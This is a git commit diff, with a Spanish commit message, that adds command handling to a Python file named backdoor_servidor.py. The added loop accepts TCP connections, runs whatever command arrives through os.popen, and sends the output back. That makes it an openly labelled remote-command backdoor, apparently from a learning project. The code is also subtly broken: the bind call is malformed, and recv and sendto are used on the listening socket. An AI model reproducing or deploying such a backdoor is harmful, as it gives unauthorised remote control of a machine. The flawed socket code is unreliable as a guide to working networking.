5f784c0f362468c03f0dee5da9fe1e79e5273a30
Andrés Hernández Mata <andreshernandezmta@gmail.com>
2021-04-09 00:28:54 -0500

    Ejecutando comandos con os
    Recibiendo los comandos al servidor

--- src/backdoor_servidor.py
+++ src/backdoor_servidor.py
@@ -8,6 +8,7 @@ Fecha: 08 Abril 2020
 
 import socket
 import sys
+import os
 
 localIP = "127.0.0.1"
 localPort = 2000
@@ -17,4 +18,15 @@ TCPServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 TCPServerSocket.bind(localIP, localPort)
 TCPServerSocket.listen()
 
+print("[*] Inicializando servidor...")
+
+while(True):
+    cliente, servidor = TCPServerSocket.accept()
+    print("[*] Comando recibido...") 
+    comando = TCPServerSocket.recv(bufferSize)
+    print("[*] Ejecutando comando...")  
+    stream = os.popen(comando.decode())
+    salida = stream.read()
+    print("[*] Enviando la salida...")  
+    TCPServerSocket.sendto(str.encode(salida), servidor)
 
